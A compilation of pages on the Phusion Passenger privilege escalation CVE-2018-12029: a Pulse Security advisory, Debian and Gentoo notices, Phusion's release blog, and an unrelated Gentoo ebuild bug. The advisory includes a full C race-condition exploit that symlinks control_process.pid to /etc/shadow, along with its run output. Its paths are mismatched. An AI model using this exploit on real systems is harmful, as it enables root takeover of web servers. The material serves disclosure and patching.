=== Content from pulsesecurity.co.nz_2322f144_20250125_133722.html ===


# [Pulse Security Logo](/index.html)

* [Home](/)
* [Our Team](/team)
* [Our Services](/services/penetration-testing)
  + [Penetration Testing](/services/penetration-testing)
  + [Adaptive Defence Review](/services/adaptive-defence-review)
  + [Incident Response](/services/incident-response)
  + [Consultancy](/services/consultancy)
* [Releases](/releases)
* [Careers](/careers)
* [Contact Us](/#contact-us)

# Phusion Passenger chown() race privilege escalation (CVE-2018-12029)

by Denis Andzakovic

### Recent Releases

#### advisories [See all](/advisories)

* 12/6/24

  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
* 5/6/24

  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
* 18/3/24

  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
* 20/9/23

  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

---

#### articles [See all](/articles)

* 12/12/24

  [USB Horsemen of the HID Apocalypse](/articles/usbhorsemen)
* 29/11/24

  [Tales From The Crypt: Microsoft Unicode Collation Oddities Leading to Software Vulnerabilities](/articles/mssql-unicode-collation-bugs)
* 4/8/24

  [Noot - Encrypted resumable ICMP exfiltration](/articles/noot-icmp-exfil)
* 23/7/24

  [A hex editor and nothing to lose - Binary patching Golang to fix net/http](/articles/golang-patching)

Jun 13 2018

Phusion Passenger’s Nginx module is vulnerable to a privilege escalation vulnerability when run with a non-standard `passenger_instance_registry_dir` configuration. A vulnerability exists when creating the `control_process.pid` file, specifically when the file’s owner is changed from root. An attacker can use this behavior to escalate privileges from the www-data user to the root user when Nginx is restarted.

**Title:** Phusion Passenger – ngx\_http\_passenger\_module privilege escalation

**Date Released:** 13/06/2018

**CVE:** CVE-2018-12029

**Author:** Denis Andzakovic

**Vendor Website:** https://www.phusionpassenger.com/

**Affected Software:** Phusion Passenger < 5.3.2 – Nginx module

## Privilege Escalation

The Passenger Nginx module creates a `control_process.pid` file and uses a `chown` system call to change the owner to `www-data`. By changing the `control_process.pid` file to a symbolic link after the files creation but prior to the `chown` call, an attacker may change the ownership of any file on the filesystem to `www-data`. The following extract from the `ngx_http_passenger_module.c` file details the issue.

```
449 	if (create_file(cycle, filename, (const u_char *) "", 0) != NGX_OK) {
450 	result = NGX_ERROR;
451 	goto cleanup;
452 	}
453 	do {
454 		ret = chown((const char *) filename, (uid_t) core_conf->user, (gid_t) -1);
455 	} while (ret == -1 && errno == EINTR);
456 	if (ret == -1) {
457 		result = NGX_ERROR;
458 	goto cleanup;
459 	}

```

The `passenger_instance_registry_dir` (which sets the passenger temporary directory location) needs to be set to a directory controllable by the `www-data` user for this vulnerability to be practically exploitable. By default, the Passenger Nginx installations are not configured in such a way that this race condition is exploitable,however non-standard temporary directory configurations are not unusual. In the exploit proof-of-concept code detailed on the following page, the `passenger_instance_registry_dir` was set to `/opt/mytmp`, and configured as follows:

```
~$ ls -ld /opt/mytmp/
drwxr-xr-x 3 www-data www-data 4096 May 9 23:06 /opt/mytmp/

```

The following proof-of-concept waits for the creation of the `passenger-<random>` directory and replaces it with a new directory structure, including a `control_process.pid` symbolically linked to `/etc/shadow`. An attacker that controls `/etc/shadow` can manually set the password for the root user, effectively achieving privilege escalation. Please note, if testing this POC the `/etc/shadow` file will likely be overwritten with the Passenger process ID. `/etc/crontab` may be a wiser target for practical exploitation purposes.

### Proof-of-Concept

```
~$ ./privesc
[+] watching /opt/mytmp
[+] read 48
[+] Got name: passenger.JyOTuQI len 32
[+] Attacking: /opt/mytmp/passenger.JyOTuQI
[+] Race won? Check /etc/shadow
~$ ls -l /etc/shadow
-rw-r--r-- 1 www-data shadow 5 May 9 23:28 /etc/shadow

```
### Proof-of-Concept - Exploit Code

```
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/inotify.h>

#define BUF_LEN (10 * (sizeof(struct inotify_event) + NAME_MAX + 1))

extern int errno;

void create_dummy_dir(){
 	if(mkdir("/var/tmp/passenger-privesc", 0755) < 0){
 		printf("[!] mkdir failed: %s\n", strerror(errno));
 		_exit(1);
 	}
 	if(mkdir("/var/tmp/passenger-privesc/web_server_info", 0755) < 0){
 		printf("[!} mkdir failed: %s\n", strerror(errno));
 		_exit(1);
 	}
 	if(symlink("/etc/shadow","/var/tmp/passengerprivesc/web_server_info/control_process.pid") < 0){
 		printf("[!] symlink failed: %s\n", strerror(errno));
 		_exit(1);
 	}
}

int main(){
 	char * passenger_instance_registry_dir = "/opt/mytmp";
 	int tlen = strlen(passenger_instance_registry_dir);
 	int inot_fd, w;
 	struct inotify_event * event;
 	char buf[BUF_LEN];
 	char * p;
 	ssize_t len;

	create_dummy_dir();

	char target_path[strlen(passenger_instance_registry_dir) + 19];
 	memset(target_path, 0x00, sizeof(target_path));
 	char junk_path[strlen(passenger_instance_registry_dir) + 6];
 	snprintf(target_path, sizeof(target_path), "%s/passenger.XXXXXXX",
passenger_instance_registry_dir);
 	snprintf(junk_path, sizeof(junk_path), "%s/junk", passenger_instance_registry_dir);

	inot_fd = inotify_init();
 	if(inot_fd < 0){
 		printf("[!] inotify_init() failed: %s\n", strerror(errno));
 		return 1;
 	}
 w = inotify_add_watch(inot_fd, passenger_instance_registry_dir, IN_CREATE);
 if(w < 0){
 	printf("[!] inotify_add_watch() failed: %s\n", strerror(errno));
	return 1;
}
	printf("[+] watching %s\n", passenger_instance_registry_dir);

	while(1){
 		len = read(inot_fd, buf, BUF_LEN);
 		printf("[+] read %zd\n", len);

		for (p = buf; p < buf + len; ) {
 			event = (struct inotify_event *) p;
 			if(event->name[0] == 0x70){ // check the first character is 'p'.
 				printf("[+] Got name: %s len %u\n", event->name, event->len);

				memcpy(target_path+sizeof(target_path)-8, event->name+10, 7);
 				printf("[+] Attacking: %s\n", target_path);

				rename(target_path,junk_path);
 				rename("/var/tmp/passenger-privesc",target_path);

				printf("[+] Race won? Check /etc/shadow\n");
 				goto end;
 			}
 			p += sizeof(struct inotify_event) + event->len;
 		}
 	}
end:
 	return 1;
}

```
## Disclosure Timeline

14/05/2018 – Vulnerability disclosed to Phusion team

15/05/2018 – Response from Phusion, advising they need some time to review the code base for similar
vulnerabilities.

26/05/2018 – Update from Phusion developers, release is still under development.

06/06/2018 – Update from Phusion developers, release is planned.

08/06/2018 – Update from Phusion developers with the CVE number.

13/06/2018 – Phusion Passenger 5.3.2 released

13/06/2018 – Advisory released

---

*Follow us on [LinkedIn](https://nz.linkedin.com/company/pulsesecurity)*

---

### Contact Us

Email us: info at pulsesecurity.co.nz

+64 4 889 4756 (Wellington)

+64 9 889 6871 (Auckland)

###

Pulse Security

PO Box 610

Wellington 6140

New Zealand

© Pulse Security Ltd. All rights reserved.



=== Content from lists.debian.org_4d45da4f_20250125_133721.html ===


---

[[Date Prev](msg00006.html)][[Date Next](msg00008.html)]
[[Thread Prev](msg00006.html)][[Thread Next](msg00008.html)]
[[Date Index](maillist.html#00007)]
[[Thread Index](threads.html#00007)]

# [SECURITY] [DLA 1399-1] ruby-passenger security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1399-1] ruby-passenger security update
* *From*: Markus Koschany <apo@debian.org>
* *Date*: Wed, 27 Jun 2018 21:39:46 +0200
* *Message-id*: <[[🔎]](/msgid-search/e2221046-3384-7a06-5223-2b108d2b2033%40debian.org) [e2221046-3384-7a06-5223-2b108d2b2033@debian.org](msg00007.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Package        : ruby-passenger
Version        : 4.0.53-1+deb8u1
CVE ID         : CVE-2015-7519 CVE-2018-12029
Debian Bug     : 864651

Two flaws were discovered in ruby-passenger for Ruby Rails and Rack
support that allowed attackers to spoof HTTP headers or exploit a race
condition which made privilege escalation under certain conditions
possible.

CVE-2015-7519
    Remote attackers could spoof headers passed to applications by using
    an underscore character instead of a dash character in an HTTP
    header as demonstrated by an X_User header.

CVE-2018-12029
    A vulnerability was discovered by the Pulse Security team. It was
    exploitable only when running a non-standard
    passenger_instance_registry_dir, via a race condition where after a
    file was created, there was a window in which it could be replaced
    with a symlink before it was chowned via the path and not the file
    descriptor. If the symlink target was to a file which would be
    executed by root such as root's crontab file, then privilege
    escalation was possible. This is now mitigated by using fchown().

For Debian 8 "Jessie", these problems have been fixed in version
4.0.53-1+deb8u1.

We recommend that you upgrade your ruby-passenger packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEErPPQiO8y7e9qGoNf2a0UuVE7UeQFAlsz6AJfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldEFD
RjNEMDg4RUYzMkVERUY2QTFBODM1RkQ5QUQxNEI5NTEzQjUxRTQACgkQ2a0UuVE7
UeQSpxAAklv4ej1DCE6ffp3Rztw1IAMTNdMG79pYWYpdas2/oIyNxu8Jq+a+pEXk
dgW5eUqGsBJrGUiTqZ8hoEWew+icoYpShG2TI3zSCtjgaQCxFjmcwWNaLlqXKrYU
EF7cMp/2CKV0psLSK+JehvdS3t7/31vYvRCBBYr0XxXEnhLnsy1YvBlZYopnfgcI
u8mRJxfhurf076DXRjZEcFSY30TYo0qUr65kB9OJdNSbb8rpXJRPFL7AIEIf9A6D
W18OGxiQ0vlxbITccc1Z7OzYn+9XnLpUgotExU0A2KcMrNQoRngkdcIFl77aN2CJ
LhNL6mWfrVeiFzMMXzZm8REsvTFSF6klLPpBj/eadMeKDCSHP/dr09SB1pK77Zuv
jduO4TqbK1bqmmBgh5/pQ7kDEqDswbHkhmnJP0CqO9VhhVk7uCeULVVoq//8Hdxl
1CoaQMc7A6pWod9sLzHWgsUOuYSQRxMHIQRKiNwbYc9L2RvqjVZsFNYjM+mTc+yw
Q0NWUo4Hk50XMEc/ydId7cZ7s+LSJLPmQ7k57de6/7WRVBxsca7WtngnBqpyeFD5
dmkFoQJ/8JIS+sro/2FZNIi+apo16cuMmcmPx+S2HLgewXnBVyzpROjzsLc9+EGj
QbezCLPz6N9ywZJzh6bD9CzL8NlasseA9HiwhGzb6iae4G3RESo=
=iuEn
-----END PGP SIGNATURE-----

```

---



=== Content from bugs.gentoo.org_0ce66cbf_20250126_090122.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 65834
ebuild for new version of net-p2p/mutella (0.4.5)
Last modified: 2004-10-05 09:48:44 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=65834&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=65834&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 65834**](show_bug.cgi?id=65834)
- ebuild for new version of net-p2p/mutella (0.4.5)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
ebuild for new version of net-p2p/mutella (0.4.5)

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | New packages ([show other bugs](buglist.cgi?component=New%20packages&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | High enhancement | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo net-p2p team | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2004-09-29 11:20 UTC by Thomas Cort (RETIRED) | | --- | --- | | Modified: | 2004-10-05 09:48 UTC ([History](show_activity.cgi?id=65834)) | | CC List: | 0 users | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**eBuild for mutella 0.4.5**](attachment.cgi?id=40723 "View the content of the attachment") (mutella-0.4.5.ebuild,680 bytes, text/plain)  [2004-09-29 11:21 UTC](#attach_40723 "Go to the comment associated with the attachment"), Thomas Cort (RETIRED) | [Details](attachment.cgi?id=40723&action=edit) | | [View All](attachment.cgi?bugid=65834&action=viewall)  [Add an attachment](attachment.cgi?bugid=65834&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=65834&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Thomas Cort (RETIRED)   gentoo-dev  2004-09-29 11:20:44 UTC  ``` mutella 0.4.5 is out, the attached ebuild emerge's successfully with gcc 3.4.2 on my system.   Reproducible: Always Steps to Reproduce: 1. emerge mutella  Actual Results:   It emerge'd successfully.  Expected Results:   emerge mutella  Portage 2.0.51_rc6 (default-x86-2004.0, gcc-3.4.2, glibc-2.3.4.20040808-r0, 2.6.8-ck8 i686) ================================================================= System uname: 2.6.8-ck8 i686 Intel(R) Celeron(R) CPU 2.70GHz Gentoo Base System version 1.5.3 Autoconf: sys-devel/autoconf-2.59-r4 Automake: sys-devel/automake-1.8.5-r1 Binutils: sys-devel/binutils-2.15.90.0.1.1-r3 Headers:  sys-kernel/linux-headers-2.4.22 Libtools: sys-devel/libtool-1.5.2-r5 ACCEPT_KEYWORDS="x86 ~x86" AUTOCLEAN="yes" CFLAGS="-O2 -fomit-frame-pointer" CHOST="i686-pc-linux-gnu" COMPILER="" CONFIG_PROTECT="/etc /usr/X11R6/lib/X11/xkb /usr/kde/2/share/config /usr/kde/3.2/share/config /usr/kde/3.3/env /usr/kde/3.3/share/config /usr/kde/3.3/shutdown /usr/kde/3/share/config /usr/lib/mozilla/defaults/pref /usr/share/config /usr/share/texmf/dvipdfm/config/ /usr/share/texmf/dvips/config/ /usr/share/texmf/tex/generic/config/ /usr/share/texmf/tex/platex/config/ /usr/share/texmf/xdvi/ /var/qmail/control" CONFIG_PROTECT_MASK="/etc/gconf /etc/terminfo /etc/env.d" CXXFLAGS="-O2 -fomit-frame-pointer -fpermissive" DISTDIR="/usr/portage/distfiles" FEATURES="autoaddcvs ccache distlocks sandbox" GENTOO_MIRRORS="ftp://cs.ubishops.ca:2121/pub/gentoo ftp://cs.ubishops.ca/pub/gentoo" MAKEOPTS="-j2" PKGDIR="/usr/portage/packages" PORTAGE_TMPDIR="/var/tmp" PORTDIR="/usr/portage" PORTDIR_OVERLAY="" SYNC="rsync://rsync.ca.gentoo.org/gentoo-portage" USE="X aim alsa apm arts audiofile avi berkdb bitmap-fonts bzlib calendar cdinstall cdr cdrom chroot cpdflib crypt cups dba directfb divx4linux dv dvdread encode esd f77 faac faad fbcon fbdev ffmpeg flac flash foomaticdb ftp gcj gcl gd gdbm gif gnome gphoto2 gpm gtk gtk2 gtkhtml i8x0 imlib jabber java javascript jikes jpeg kde libdsk libg++ libwww lzw-tiff mad md5sum mhash mikmod motif mozaccess mozcalendar mozctl mozdomi mozilla moznocompose moznoirc moznomail mpeg mpeg4 mplayer msn music mysql nas native ncurses net nethack nls nocd noexperimental nojoystick nomac noreiserfs ntlm oav offensive oggvorbis opengl oscar oss pam pdflib perl php png posix postgres pthreads python qt quicktime readline ruby sdl slang sndfile snmp sockets spell ssl svga tcltk tcpd tetex threads truetype usb vanilla x86 xml xml2 xmms xprint xv xvid yahoo zlib" ```  [Comment 1](#c1)  Thomas Cort (RETIRED)   gentoo-dev  2004-09-29 11:21:44 UTC  ``` Created [attachment 40723](attachment.cgi?id=40723 "eBuild for mutella 0.4.5") [[details](attachment.cgi?id=40723&action=edit "eBuild for mutella 0.4.5")] eBuild for mutella 0.4.5 ```  [Comment 2](#c2)  Jon Hood (RETIRED)   gentoo-dev  2004-10-05 09:48:44 UTC  ``` now in portage with a few minor alterations- thank you :) ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=65834)
* - [XML](show_bug.cgi?ctype=xml&id=65834)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=65834)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=65834&product=Gentoo%20Linux)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=65834&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=65834&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from security.gentoo.org_14871d02_20250125_133722.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Passenger: Multiple Vulnerabilities — GLSA **201807-02**

Multiple vulnerabilities have been found in Passenger, the worst of
which could result in the execution of arbitrary code.

### Affected packages

| Package | **www-apache/passenger** on all architectures |
| --- | --- |
| Affected versions | < **5.3.2** |
| Unaffected versions | >= **5.3.2** |

### Background

Passenger runs and manages your Ruby, Node.js, and Python apps.

### Description

Multiple vulnerabilities have been discovered in Passenger. Please
review the CVE identifiers referenced below for details.

### Impact

A remote attacker could escalate privileges, execute arbitrary code,
cause a Denial of Service condition, or obtain sensitive information.

### Workaround

There is no known workaround at this time.

### Resolution

All Passenger users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-apache/passenger-5.3.2"

```
### References

* [CVE-2018-12026](https://nvd.nist.gov/vuln/detail/CVE-2018-12026)
* [CVE-2018-12027](https://nvd.nist.gov/vuln/detail/CVE-2018-12027)
* [CVE-2018-12028](https://nvd.nist.gov/vuln/detail/CVE-2018-12028)
* [CVE-2018-12029](https://nvd.nist.gov/vuln/detail/CVE-2018-12029)

**Release date**

July 22, 2018

**Latest revision**

July 22, 2018: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [658346](https://bugs.gentoo.org/show_bug.cgi?id=658346)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from blog.phusion.nl_d05e0cfb_20250125_133721.html ===

Hamburger

* Phusion logo
* [Home](https://www.phusion.nl)
* [Passenger](https://www.phusionpassenger.com)
* [Blog](https://blog.phusion.nl)
* [About](https://www.phusion.nl/about)
* Contact

[Twitter](https://twitter.com/phusion_nl)
[Github](https://github.com/phusion)
[Video](https://vimeo.com/phusionnl)

[Privacy Policy & Disclaimer](https://www.phusion.nl/privacy)
[Trademark Notice](https://www.phusion.nl/trademarks)

[Passenger 5.3.2: various security fixes](/2018/06/12/passenger-5-3-2-various-security-fixes/)

![Camden Narzt](/content/images/2016/07/IMG_0673.jpg)

[Camden Narzt](/author/camden-narzt/)
Software Developer

June 12th, 2018

[Passenger](/tag/passenger/)

## About us

Founded in 2008, Phusion creates top of the line server software to power businesses like Apple and Intercom.

Version 5.3.2 of the [Passenger](https://www.phusionpassenger.com/) application server for Ruby, Node.js, Meteor and Python has been released. This release contains fixes for 4 CVEs and we urge you to upgrade.

## [CVE-2018-12029] CHMOD race vulnerability

The [Pulse Security](https://pulsesecurity.co.nz/) team discovered a vulnerability in Passenger.

The file system access race condition allows for local privilege escalation and affects the Nginx module for Passenger versions 5.3.1, all the way back to 3.0.0 (the chown command entered the code in 2010).

The vulnerability was exploitable only when running a non-standard

`passenger_instance_registry_dir`, via a race condition where after a file was created, there was a window in which it could be replaced with a symlink before it was chowned via the path and not the file descriptor.

If the symlink target was to a file which would be executed by root such as root's crontab file, then privilege escalation was possible.

This is now mitigated by using `fchmod()`.

### Improved security warnings for various directories

We recognized that CVE-2018-12029 could be an indication of a larger class of similar vulnerabilities, so we immediately started investigating our codebase for other vulnerabilities. We found that a lot of security properties depend on the security of various directories that the user configured Passenger to use. Therefore, we've introduced more security checks into Passenger.

We now check the permissions on the instance registry directory in the same way we [already check](https://blog.phusion.nl/2017/10/16/passenger-5-1-11/#newsecuritypitfallcheck) the Passenger root directory. If the instance registry directory is not secure, that can result in arbitrary file overwrites so it's good practice to fix these warnings if you see them.

## [CVE-2018-12026 - 12027 - 12028] SpawningKit exploits

Continuing our security investigation, we found a few vulnerabilities in SpawningKit, affecting Passenger versions 5.3.0 - 5.3.1. SpawningKit is subsystem in Passenger responsible for spawning application processes, and it has gotten a major overhaul in version 5.3.0. However this overhaul introduced new vulnerabilities, which allow a malicious app to cause:

1. a local DoS on the system, or
2. a local privilege escalation, or
3. a local information disclosure

Malicious users on the same system, other than the app's user, could use race conditions to make Passenger connect to (and forward traffic to) arbitrary sockets.

In the first case a malicious app could report its PID incorrectly, then fail to start at which point Passenger would kill the PID regardless of who owned it.

In the second and third case, reads and writes to arbitrary file paths could be induced by replacing specific path elements with symlinks.

In the last case if any of the parent directories of the app socket dir is writable by another user (Joe) that is not the app's user (Jane), then Joe can swap that directory with contents he controls. That way, Joe can cause Passenger to connect to (and forward Jane's traffic to) a process that does not actually belong to Jane.

We mitigate these issues with extra permission checks, by using symlink-resistant I/O operations, and by insisting that any sockets must be created inside the instance directory's app's subdirectory. As well as by not killing the PID returned by the preloader unless we have verified that it is indeed genuine (owned by the app user).

### Spawning Error Reporting

During the Handshake step of spawning an app, we ensure that more kinds of spawning exceptions contain environment variable information. This will help us detect bugs or security attacks in the future.

## Various improvements & fixes

* Fixes Meteor support in non-bundled mode (regression from 5.3.0). Closes [GH-2082](https://github.com/phusion/passenger/issues/2082).
* [Apache] Fixes PassengerMaxInstancesPerApp not being respected (regression from config refactor in 5.2.0). Closes [GH-2059](https://github.com/phusion/passenger/issues/2059).
* [Enterprise, Apache] Fixes PassengerMaxInstances not being respected (regression from config refactor in 5.2.0).
* [Enterprise] Fixes passenger-irb being unable to connect to an app process (regression from 5.3.0). Closes [GH-2087](https://github.com/phusion/passenger/issues/2087).

## Installing 5.3.2

Besides support for the latest software (Nginx stable, Ubuntu), the [5.3 series](https://blog.phusion.nl/2018/05/09/passenger-5-3-0/) of Passenger features per-application logfiles. There has been a lot of work on the internals to enable vastly [improved error reporting](https://blog.phusion.nl/2018/05/16/the-bfg-errorpage/).

The 5.x series of Passenger in general brings a plethora of [improvements](https://blog.phusion.nl/2017/01/10/passenger-5-1-1/) in uptime maximization, security and efficiency. Please see the [installation guide](https://www.phusionpassenger.com/library/install/).

## Upgrading to 5.3.2

We strongly advise staying up to date with the latest version.

Check out our upgrade guides for the different platforms:

* [OS X](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#osx)
* [Debian](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#debian_ubuntu)
* [Ubuntu](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#debian_ubuntu)
* [Heroku](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#heroku)
* [Red Hat](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#redhat_centos)
* [CentOS](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#redhat_centos)
* [Ruby gem](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#rubygems)
* [Tarball](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html#source_tarball)
* [Docker](https://github.com/phusion/passenger-docker#upgrading_passenger)

If you are upgrading from 4.x, please read [the 5.0 upgrade notes](https://www.phusionpassenger.com/library/install/migrating/) to learn about potential upgrade caveats.

Please be aware that you can enjoy [enterprise features](https://www.phusionpassenger.com/enterprise) and sponsor the open source development directly by [buying Phusion Passenger Enterprise](https://www.phusionpassenger.com/get_it_now).

## Supercharge your Ruby, Node.js and Python apps

Over 650,000+ sites use **Passenger** as their app server to ensure that their web apps, microservices and APIs are served with outstanding reliability, performance and control.

[learn more](https://www.phusionpassenger.com)

[![](/assets/images/github.svg) Follow on Github](https://github.com/phusion/passenger)

[![](/assets/images/github.svg) Follow @phusion](https://github.com/phusion)

[### Passenger 6

Now supporting all languages](https://www.phusionpassenger.com/passenger6)
[### Discuss on HackerNews

Let us know your thoughts!](https://news.ycombinator.com/submitlink?u=https://blog.phusion.nl/2018/06/12/passenger-5-3-2-various-security-fixes/&t=Passenger 5.3.2: various security fixes)
[### Discuss on Twitter

And follow us on @phusion\_nl](https://twitter.com/share?text=Passenger%205.3.2%3A%20various%20security%20fixes&url=https://blog.phusion.nl/2018/06/12/passenger-5-3-2-various-security-fixes/)

# Stay in the event loop

Get news and tips on our products and/or programming in general.

## Related articles

* [Lower latencies during deploys in new releases of Phusion Passenger](/2024/12/10/changes-to-routing-in-passenger/)
* [Passenger 6.0.24](/2024/12/09/passenger-6-0-24/)
* [Passenger 6.0.23](/2024/07/29/passenger-6-0-23/)
* [Passenger 6.0.22](/2024/05/18/passenger-6-0-22/)
* [Passenger 6.0.21](/2024/05/17/passenger-6-0-21/)
* [Passenger 6.0.20](/2024/01/22/passenger-6-0-20/)
* [Passenger 6.0.19](/2023/11/20/passenger-6-0-19/)
* [Passenger 6.0.18](/2023/06/12/passenger-6-0-18/)
* [Passenger 6.0.17](/2023/01/25/passenger-6-0-17/)
* [Passenger 6.0.16](/2022/12/19/passenger-6-0-16/)

logo

### Products

* [Passenger](https://www.phusionpassenger.com)
* [Premium Support](https://www.phusionpassenger.com/support)

### About

* [Mission](https://www.phusion.nl/about#splash)

### Contact

* General
* [Security](https://www.phusionpassenger.com/contact)

[Twitter](https://twitter.com/phusion_nl)
[Github](https://github.com/phusion)
[Video](https://vimeo.com/phusionnl)

